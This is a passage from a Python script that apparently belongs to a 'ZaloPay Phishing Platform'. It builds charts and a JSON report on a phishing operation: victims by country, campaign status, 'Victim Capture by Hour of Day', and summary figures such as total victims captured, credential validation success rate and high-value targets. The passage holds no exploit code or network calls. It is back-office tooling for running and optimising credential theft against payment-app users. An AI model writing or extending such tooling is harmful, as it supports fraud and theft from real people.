            plt.xlabel('Country')
            plt.ylabel('Number of Victims')
            plt.xticks(rotation=45)
            plt.tight_layout()
            plt.savefig(f"{output_dir}/geographic_distribution.png", dpi=300, bbox_inches='tight')
            plt.close()
        
        # 2. Campaign Performance Chart
        campaign_data = self.report_data.get('operational_metrics', {}).get('campaign_metrics', {})
        if campaign_data.get('campaign_status_distribution'):
            plt.figure(figsize=(10, 6))
            statuses = [item['_id'] for item in campaign_data['campaign_status_distribution']]
            counts = [item['count'] for item in campaign_data['campaign_status_distribution']]
            
            plt.pie(counts, labels=statuses, autopct='%1.1f%%')
            plt.title('Campaign Status Distribution')
            plt.savefig(f"{output_dir}/campaign_status.png", dpi=300, bbox_inches='tight')
            plt.close()
        
        # 3. Success Rate Trends
        temporal_data = self.report_data.get('operational_metrics', {}).get('temporal_patterns', {})
        if temporal_data.get('hourly_patterns'):
            plt.figure(figsize=(14, 6))
            hours = [item['_id'] for item in temporal_data['hourly_patterns']]
            counts = [item['count'] for item in temporal_data['hourly_patterns']]
            
            plt.plot(hours, counts, marker='o')
            plt.title('Victim Capture by Hour of Day')
            plt.xlabel('Hour')
            plt.ylabel('Number of Captures')
            plt.grid(True, alpha=0.3)
            plt.savefig(f"{output_dir}/hourly_patterns.png", dpi=300, bbox_inches='tight')
            plt.close()
        
        print(f"📊 Visualizations saved to {output_dir}")

async def main():
    """Main function to generate comprehensive report"""
    
    print("📊 ZaloPay Phishing Platform - Comprehensive Reporting System")
    print("=" * 70)
    
    # Get report type from command line argument
    report_type = sys.argv[1] if len(sys.argv) > 1 else 'full'
    
    reporter = ComprehensiveReportingSystem()
    report = await reporter.generate_comprehensive_report(report_type)
    
    # Generate visualizations
    reporter.generate_visualizations()
    
    # Save report to file
    output_file = f"/opt/zalopay/reports/comprehensive_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    os.makedirs(os.path.dirname(output_file), exist_ok=True)
    
    with open(output_file, 'w') as f:
        json.dump(report, f, indent=2, default=str)
    
    # Print summary
    print(f"\n📋 Report Summary:")
    print(f"   Report ID: {report['report_id']}")
    print(f"   Report Type: {report_type}")
    print(f"   Generated: {report['timestamp']}")
    
    if 'executive_summary' in report:
        exec_summary = report['executive_summary']
        print(f"   Total Victims: {exec_summary.get('total_victims_captured', 0):,}")
        print(f"   Success Rate: {exec_summary.get('validation_success_rate', 0):.1f}%")
        print(f"   High-Value Targets: {exec_summary.get('high_value_targets', 0):,}")
        print(f"   Risk Level: {exec_summary.get('risk_level', 'unknown').upper()}")
    
    print(f"   Recommendations: {len(report.get('recommendations', []))}")
    print(f"   Output File: {output_file}")
    
    print(f"\n✅ Comprehensive report generated successfully!")

if __name__ == "__main__":
    asyncio.run(main())